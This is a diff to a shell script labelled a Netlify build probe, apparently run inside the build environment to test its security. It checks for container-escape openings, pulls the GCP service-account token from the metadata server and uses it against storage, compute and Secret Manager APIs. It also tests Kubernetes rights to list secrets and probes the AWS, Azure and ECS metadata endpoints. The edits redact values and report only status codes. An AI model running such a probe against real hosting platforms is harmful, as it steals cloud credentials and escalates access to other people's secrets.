@@ -8,7 +8,7 @@ exec > >(tee "$OUT") 2>&1
 red(){ v="$1"; n=${#v}; [ "$n" -gt 0 ] && echo "<present len=$n>" || echo "<absent>"; }
 echo "===== NETLIFY BUILD PROBE $(date -u) ====="
 echo "## identity/kernel"; id; uname -a; head -2 /etc/os-release 2>/dev/null; echo "cwd=$(pwd)"
-echo "## caps + ns + cgroup"; grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status; readlink /proc/self/ns/* 2>/dev/null|sort -u; head -3 /proc/1/cgroup 2>/dev/null; head -3 /proc/self/cgroup 2>/dev/null
+echo "## caps + ns + cgroup"; grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status; echo "self-ns:"; readlink /proc/self/ns/* 2>/dev/null|sort -u; echo "pid1-ns:"; readlink /proc/1/ns/* 2>/dev/null|sort -u; head -3 /proc/1/cgroup 2>/dev/null; head -3 /proc/self/cgroup 2>/dev/null
 echo "## mounts (host/docker/k8s/secret hints)"; grep -iE 'docker|containerd|kube|secret|overlay|/dev/(vd|sd|nvme)|hostpath|gcs|csi' /proc/self/mountinfo 2>/dev/null|head -25
 echo "## escape surface"; ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)"; ls -la /dev/mem 2>/dev/null
 echo "## == GCP METADATA =="
@@ -31,21 +31,28 @@ if [ -n "$M" ]; then
 else
   PROJECT_ID=""; NUMERIC_PROJECT_ID=""; SA_EMAIL=""
 fi
-echo "project: $PROJECT_ID"
-echo "numeric: $NUMERIC_PROJECT_ID"
-echo "sa-email: $SA_EMAIL"
-echo "sa-scopes:"; [ -n "$M" ] && meta_get "$M/instance/service-accounts/default/scopes"
+echo "project: $(red "$PROJECT_ID")"
+echo "numeric: $(red "$NUMERIC_PROJECT_ID")"
+echo "sa-email: $(red "$SA_EMAIL")"
+if [ -n "$M" ]; then echo "sa-scopes: $(curl --noproxy '*' -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "$H" "$M/instance/service-accounts/default/scopes" 2>/dev/null)"; else echo "sa-scopes: not-queried"; fi
 TOKJSON=""; [ -n "$M" ] && TOKJSON=$(meta_get "$M/instance/service-accounts/default/token")
 ATOK=$(echo "$TOKJSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
 echo "sa-token: $(red "$ATOK") (redacted)"
 if [ -n "$M" ]; then echo "instance-attrs: $(curl --noproxy '*' -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "$H" "$M/instance/attributes/?recursive=true" 2>/dev/null)"; else echo "instance-attrs: not-queried"; fi
 echo "== USE SA token to test access (escalation) =="
 if [ -n "$ATOK" ]; then
-  echo "tokeninfo scopes:"; curl -s -m6 "https://oauth2.googleapis.com/tokeninfo?access_token=$ATOK" | head -c 400; echo
-  echo "GCS list (project buckets):"; curl -s -m8 -H "Authorization: Bearer $ATOK" "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" | head -c 400; echo
-  echo "GCE self:"; curl -s -m8 -H "Authorization: Bearer $ATOK" "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones" | head -c 300; echo
-  echo "secret manager list:"; curl -s -m8 -H "Authorization: Bearer $ATOK" "https://secretmanager.googleapis.com/v1/projects/$NUMERIC_PROJECT_ID/secrets" | head -c 400; echo
+  echo "tokeninfo:"; curl -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' "https://oauth2.googleapis.com/tokeninfo?access_token=$ATOK"; echo
+  echo "GCS list (project buckets):"; curl -s -m8 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $ATOK" "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID"; echo
+  echo "GCE self:"; curl -s -m8 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $ATOK" "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones"; echo
+  echo "secret manager list:"; curl -s -m8 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $ATOK" "https://secretmanager.googleapis.com/v1/projects/$NUMERIC_PROJECT_ID/secrets"; echo
 fi
+echo "## == OTHER CLOUD METADATA (status only) =="
+AWS_META="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+AZ_META="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+ECS_META="http://169.254.170.2/v2/metadata"
+echo "aws-iam-role-code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' "$AWS_META" 2>/dev/null || echo 000)"
+echo "azure-instance-code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' -H 'Metadata: true' "$AZ_META" 2>/dev/null || echo 000)"
+echo "ecs-task-code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' "$ECS_META" 2>/dev/null || echo 000)"
 echo "## == KUBERNETES =="
 echo "kube-related environment keys:"; env | sed 's/=.*//' | grep -iE 'KUBERNETES|KUBE_' | head -30
 ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
@@ -53,8 +60,8 @@ KT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); echo 
 echo "k8s-ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
 KH=${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}
 if [ -n "$KT" ]; then
-  echo "whoami (SelfSubjectReview):"; curl -sk -m6 -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authentication.k8s.io/v1/selfsubjectreviews" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 | head -c 500; echo
-  echo "can-i list secrets:"; curl -sk -m6 -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}' 2>&1 | head -c 300; echo
+  echo "whoami (SelfSubjectReview):"; curl -sk -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authentication.k8s.io/v1/selfsubjectreviews" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1; echo
+  echo "can-i list secrets:"; curl -sk -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}' 2>&1; echo
 fi
 echo "kubelet :10250 pods:"; curl -sk -m4 "https://127.0.0.1:10250/pods" 2>&1 | head -c 100; echo
 echo "## == SECRETS BEYOND MY USER =="
